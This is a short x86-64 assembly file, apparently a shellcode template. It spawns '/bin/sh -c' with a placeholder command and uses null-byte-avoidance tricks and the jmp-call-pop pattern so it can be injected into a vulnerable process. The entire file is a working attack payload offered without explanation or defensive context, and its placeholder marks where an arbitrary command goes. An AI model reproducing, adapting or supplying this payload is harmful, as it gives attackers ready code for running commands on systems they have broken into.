bits 64

section .text
global _start

_start:
    xor rcx, rcx
    push rcx
    mov rcx, 0x68732f6e69622fff
    shr rcx, 8
    push rcx
    push rsp
    pop rdi

    xor rcx, rcx
    push rcx
    push word 0x632d
    push rsp
    pop rbx

    xor rcx, rcx
    push rcx
    jmp command

execve:
    pop rdx

    mov rax, [rdx] ; dq (0xffffffffffffffff)
    shr rax, 8*7

    add rdx, 8 ; fix for dq (point to REPLACE_ME)
    xor byte [rdx+rax], 0x0a

    xor rcx, rcx
    push rcx ; null terminator for argv
    push rdx ; pointer to "REPLACE_ME"
    push rbx ; pointer to "-c"
    push rdi ; pointer to "/bin/sh"
    push rsp ; argv pointer
    pop rsi

    xor rax, rax
    mov al, 59 ; syscall: execve
    xor rdx, rdx
    syscall

command:
    call execve
data:
    dq 0xffffffffffffffff
    db "REPLACE_ME"